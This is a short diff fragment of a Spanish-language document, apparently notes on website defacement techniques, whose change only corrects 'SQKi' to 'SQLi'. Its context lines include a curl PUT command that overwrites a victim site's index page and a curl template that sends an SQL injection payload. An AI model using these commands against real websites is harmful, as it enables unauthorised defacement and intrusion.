@@ -8,7 +8,7 @@ modifica o reemplaza el contenido de un sitio web sin autorización
 
 curl -X PUT -d "@index25.htm" http://victima.com/index.htm
 
-## 2.-Metodo SQKi Inyección SQL
+## 2.-Metodo SQLi Inyección SQL
 
 curl -s "${URL}${VULN_PATH}${TEST_PAYLOAD}
 
